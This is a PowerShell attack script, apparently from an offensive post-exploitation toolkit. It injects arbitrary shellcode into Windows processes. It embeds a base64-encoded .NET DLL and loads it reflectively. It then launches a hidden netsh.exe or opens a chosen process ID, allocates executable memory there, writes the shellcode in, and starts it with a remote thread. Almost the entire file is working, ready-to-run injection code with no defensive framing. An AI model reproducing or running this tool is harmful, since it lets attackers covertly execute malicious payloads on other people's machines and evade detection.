function Inject-Shellcode ([switch]$x86, [switch]$x64, [Parameter(Mandatory=$true)]$Shellcode, $ProcID, $ProcessPath)
{
<#
.SYNOPSIS
Inject-Shellcode

Author: @benpturner
 
.DESCRIPTION
Injects shellcode into x86 or x64 bit processes. Tested on Windowns 7 32 bit, Windows 7 64 bit and Windows 10 64bit.

.EXAMPLE
Inject-Shellcode -x86 -Shellcode (GC C:\Temp\Shellcode.bin -Encoding byte)

.EXAMPLE
Inject-Shellcode -x86 -Shellcode (GC C:\Temp\Shellcode.bin -Encoding byte) -ProcID 5634

.EXAMPLE
Inject-Shellcode -x86 -Shellcode (GC C:\Temp\Shellcode.bin -Encoding byte) -ProcessPath C:\Windows\System32\notepad.exe

#>

$p = "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LgBLAB8BLgBTABkBLgBbABkBLgBjADcBLgBrAGEBYwBzAF8AgwBzAF8AowBzAF8AMQCCAJIDAQAAAQMAJQUBAAABBQCDAQEAAAEHAEIFAQAAAQkANAUBAAABCwDHBAIAAAENANMEAgAAAQ8AqQECAAABEQCeAQEAAAETAGgBAQAAARUAdgEBAASAAAABAAAAAAAAAAAAAAAAABQFAAACAAAAAAAAAAAAAAAaAD0BAAAAAAMAAgAEAAIABQACAAAAAGtlcm5lbDMyADxNb2R1bGU+AEVYRUNVVEVfUkVBRABTVVNQRU5EX1JFU1VNRQBURVJNSU5BVEUASU1QRVJTT05BVEUARVhFQ1VURV9SRUFEV1JJVEUARVhFQ1VURQBSRVNFUlZFAFdSSVRFX1dBVENIAFBIWVNJQ0FMAFNFVF9USFJFQURfVE9LRU4AU0VUX0lORk9STUFUSU9OAFFVRVJZX0lORk9STUFUSU9OAERJUkVDVF9JTVBFUlNPTkFUSU9OAFRPUF9ET1dOAExBUkdFX1BBR0VTAE5PQUNDRVNTAFBST0NFU1NfQUxMX0FDQ0VTUwBSRVNFVABDT01NSVQAR0VUX0NPTlRFWFQAU0VUX0NPTlRFWFQAUkVBRE9OTFkARVhFQ1VURV9XUklURUNPUFkAdmFsdWVfXwBtc2NvcmxpYgBscFRocmVhZElkAGR3VGhyZWFkSWQAZHdQcm9jZXNzSWQAU3VzcGVuZFRocmVhZABSZXN1bWVUaHJlYWQAQ3JlYXRlUmVtb3RlVGhyZWFkAGhUaHJlYWQAT3BlblRocmVhZABDbG9zZUhhbmRsZQBiSW5oZXJpdEhhbmRsZQBmbEFsbG9jYXRpb25UeXBlAEd1aWRBdHRyaWJ1dGUARGVidWdnYWJsZUF0dHJpYnV0ZQBDb21WaXNpYmxlQXR0cmlidXRlAEFzc2VtYmx5VGl0bGVBdHRyaWJ1dGUAQXNzZW1ibHlUcmFkZW1hcmtBdHRyaWJ1dGUAQXNzZW1ibHlGaWxlVmVyc2lvbkF0dHJpYnV0ZQBBc3NlbWJseUNvbmZpZ3VyYXRpb25BdHRyaWJ1dGUAQXNzZW1ibHlEZXNjcmlwdGlvbkF0dHJpYnV0ZQBGbGFnc0F0dHJpYnV0ZQBDb21waWxhdGlvblJlbGF4YXRpb25zQXR0cmlidXRlAEFzc2VtYmx5UHJvZHVjdEF0dHJpYnV0ZQBBc3NlbWJseUNvcHlyaWdodEF0dHJpYnV0ZQBBc3NlbWJseUNvbXBhbnlBdHRyaWJ1dGUAUnVudGltZUNvbXBhdGliaWxpdHlBdHRyaWJ1dGUAZHdTdGFja1NpemUAblNpemUAZHdTaXplAEdVQVJEX01vZGlmaWVyZmxhZwBOT0NBQ0hFX01vZGlmaWVyZmxhZwBXUklURUNPTUJJTkVfTW9kaWZpZXJmbGFnAExlbmd0aABrZXJuZWwzMi5kbGwASW5qZWN0LmRsbABGaWxsAFN5c3RlbQBFbnVtAGxwTnVtYmVyT2ZCeXRlc1dyaXR0ZW4AcERlc3RpbmF0aW9uAFN5c3RlbS5SZWZsZWN0aW9uAE1lbW9yeVByb3RlY3Rpb24AbHBCdWZmZXIAbHBQYXJhbWV0ZXIALmN0b3IAU3lzdGVtLkRpYWdub3N0aWNzAFN5c3RlbS5SdW50aW1lLkludGVyb3BTZXJ2aWNlcwBTeXN0ZW0uUnVudGltZS5Db21waWxlclNlcnZpY2VzAERlYnVnZ2luZ01vZGVzAGxwVGhyZWFkQXR0cmlidXRlcwBkd0NyZWF0aW9uRmxhZ3MAVGhyZWFkQWNjZXNzAGR3RGVzaXJlZEFjY2VzcwBoUHJvY2VzcwBPcGVuUHJvY2VzcwBHZXRDdXJyZW50UHJvY2VzcwBscEJhc2VBZGRyZXNzAGxwQWRkcmVzcwBscFN0YXJ0QWRkcmVzcwBoT2JqZWN0AEluamVjdABmbFByb3RlY3QAVmlydHVhbEFsbG9jRXgAUnRsRmlsbE1lbW9yeQBXcml0ZVByb2Nlc3NNZW1vcnkAAAAAAAAAADOd9irKpehGm2m3kmuVLsgABCABAQgDIAABBSABARERBCABAQ4EIAEBAgi3elxWGTTgiQT/Dx8ABAAQAAAEACAAAAQAAAgABAAAACAEAABAAAQAABAABAAAIAAEEAAAAAQgAAAABEAAAAAEgAAAAAQBAAAABAIAAAAEBAAAAAQIAAAABAABAAAEAAIAAAQABAAAAQICBgkDBhEMAwYREAIGCAMGERQIAAUYGBgYCQkKAAcYGBgJGBgJGAgABQIYGBgIGAYAAwEYGAUGAAMYCQIJAwAAGAQAAQIYBwADGBEUAgkEAAEJGAQAAQgY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bgAAADEALgAwAC4AMAAuADAAAAA4AAgAAQBBAHMAcwBlAG0AYgBsAHkAIABWAGUAcgBzAGkAbwBuAAAAMQAuADAALgAwAC4AMAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAgAAAMAAAAMD4AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
$dl  = [System.Convert]::FromBase64String($p)
$a = [System.Reflection.Assembly]::Load($dl)
$o = New-Object Inject
$pst = New-Object System.Diagnostics.ProcessStartInfo
$pst.UseShellExecute = $False
$pst.CreateNoWindow = $True
$pst.FileName = "C:\Windows\system32\netsh.exe"

if ($x86.IsPresent) {
    if ($env:PROCESSOR_ARCHITECTURE -eq "x86"){
        $pst.FileName = "C:\Windows\System32\netsh.exe"
    } else {
        $pst.FileName = "C:\Windows\Syswow64\netsh.exe"
    }
}
   
if ($ProcessPath) {
    $pst.FileName = "$ProcessPath"
} 
if ($ProcID){
    $Process = [System.Diagnostics.Process]::GetProcessById($ProcID)
} else {
    $Process = [System.Diagnostics.Process]::Start($pst)
}

[IntPtr]$phandle = [Inject]::OpenProcess([Inject]::PROCESS_ALL_ACCESS, $false, $Process.ID);
[IntPtr]$zz = 0x10000
[IntPtr]$x = 0
[IntPtr]$nul = 0
[IntPtr]$max = 0x70000000
while( $zz.ToInt32() -lt $max.ToInt32() )
{
    $x=[Inject]::VirtualAllocEx($phandle,$zz,$Shellcode.Length*2,0x3000,0x40)
    if( $x.ToInt32() -ne $nul.ToInt32() ){ break }
    $zz = [Int32]$zz + $Shellcode.Length
}
if( $x.ToInt32() -gt $nul.ToInt32() )
{
    $hg = [Runtime.InteropServices.Marshal]::AllocHGlobal($Shellcode.Length)
    [Runtime.InteropServices.Marshal]::Copy($Shellcode, 0, $hg, $Shellcode.Length)|Out-Null
    [Inject]::WriteProcessMemory($phandle,[IntPtr]($x.ToInt32()),$hg, $Shellcode.Length,0)|Out-Null
    [Inject]::CreateRemoteThread($phandle,0,0,[IntPtr]$x,0,0,0)|Out-Null
}


}
